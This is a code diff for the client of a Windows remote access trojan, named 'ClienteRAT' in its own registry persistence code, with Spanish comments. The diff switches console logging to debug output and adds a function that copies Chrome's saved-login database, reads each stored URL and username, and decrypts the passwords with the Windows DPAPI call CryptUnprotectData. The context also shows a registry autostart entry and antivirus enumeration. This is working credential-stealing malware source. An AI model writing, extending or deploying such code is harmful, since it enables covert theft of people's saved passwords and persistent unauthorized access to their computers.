@@ -1,16 +1,22 @@
 ﻿using Client.Native;
 using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Management;
-using System.Net.NetworkInformation;
 using System.Text;
-using System.Threading.Tasks;
+using System.Data.SQLite;
+using static Client.Native.NativeMethods;
+using System.Runtime.InteropServices;
+
 
 namespace Client.Util
 {
+    internal struct ChromePassword
+    {
+        public string URL { get; set; }
+        public string Username { get; set; }
+        public string Password { get; set; }
+
+    }
     static class Functions
     {
         public static string ListProcesses()
@@ -111,7 +117,7 @@ namespace Client.Util
                         using (RegistryKey newKey = Registry.CurrentUser.CreateSubKey(keyName))
                         {
                             newKey.SetValue("ClienteRAT", executablePath);
-                            Console.WriteLine("Entrada de registro creada con éxito.");
+                            Debug.WriteLine("Entrada de registro creada con éxito.");
                         }
                     }
                     else
@@ -121,14 +127,14 @@ namespace Client.Util
                         if (existingValue == null || existingValue.ToString() != executablePath)
                         {
                             key.SetValue("ClienteRAT", executablePath);
-                            Console.WriteLine("Entrada de registro actualizada con éxito.");
+                            Debug.WriteLine("Entrada de registro actualizada con éxito.");
                         }
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error al modificar el registro: {ex.Message}");
+                Debug.WriteLine($"Error al modificar el registro: {ex.Message}");
             }
         }
 
@@ -145,7 +151,7 @@ namespace Client.Util
             }
             catch (Exception ex)
             {
-                
+                Debug.WriteLine(ex.Message);
             }
         }
 
@@ -189,6 +195,114 @@ namespace Client.Util
             }
 
             return antivirusList.ToString();
+        }
+
+        public static List<ChromePassword> getChromePasswords()
+        {
+            List<ChromePassword> passwords = new List<ChromePassword>();
+            string LOGIN_DATA_PATH = "Google\\Chrome\\User Data\\Default\\Login Data";
+            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string loginDataPath = Path.Combine(localAppData, LOGIN_DATA_PATH);
+
+            if (!File.Exists(loginDataPath))
+            {
+                Debug.WriteLine("El archivo de datos de inicio de sesión no se encuentra en la ruta especificada.");
+                return passwords;
+            }
+
+            string tempLoginDataPath = Path.Combine(Path.GetTempPath(), "Login Data");
+
+            try
+            {
+                File.Copy(loginDataPath, tempLoginDataPath, true);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error al copiar el archivo de base de datos: {ex.Message}");
+                return passwords;
+            }
+
+            string connectionString = $"Data Source={tempLoginDataPath};Version=3;";
+            try
+            {
+                using (var conn = new SQLiteConnection(connectionString))
+                {
+                    conn.Open();
+
+                    using (SQLiteCommand cmd = new SQLiteCommand(conn))
+                    {
+                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                        using (SQLiteDataReader reader = cmd.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                string url = reader["action_url"]?.ToString();
+                                string username = reader["username_value"]?.ToString();
+                                byte[] passwordBlob = reader["password_value"] as byte[];
+
+                                if (url == null || username == null || passwordBlob == null)
+                                {
+                                    Debug.WriteLine("Se encontró un valor nulo en la base de datos.");
+                                    continue;
+                                }
+
+                                string decryptedPassword = DecryptPassword(passwordBlob);
+
+                                passwords.Add(new ChromePassword
+                                {
+                                    URL = url,
+                                    Username = username,
+                                    Password = decryptedPassword
+                                });
+                            }
+                        }
+                    }
+                    conn.Close();
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error al acceder a la base de datos: {ex.Message}");
+            }
+            finally
+            {
+                if (File.Exists(tempLoginDataPath))
+                {
+                    File.Delete(tempLoginDataPath);
+                }
+            }
+
+            return passwords;
+
+        }
+
+        private static string DecryptPassword(byte[] encryptedData)
+        {
+            DATA_BLOB dataIn = new DATA_BLOB
+            {
+                pbData = Marshal.AllocHGlobal(encryptedData.Length),
+                cbData = encryptedData.Length
+            };
+            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
+
+            DATA_BLOB dataOut = new DATA_BLOB();
+            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT
+            {
+                cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)),
+                dwPromptFlags = 0,
+                hwndApp = IntPtr.Zero,
+                szPrompt = null
+            };
+
+            
+            CryptUnprotectData(ref dataIn, null, ref dataIn, IntPtr.Zero, ref prompt, 0, ref dataOut);
+            byte[] decryptedData = new byte[dataOut.cbData];
+            Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
+
+            Marshal.FreeHGlobal(dataIn.pbData);
+            Marshal.FreeHGlobal(dataOut.pbData);
+
+            return Encoding.UTF8.GetString(decryptedData);
         }
 
 
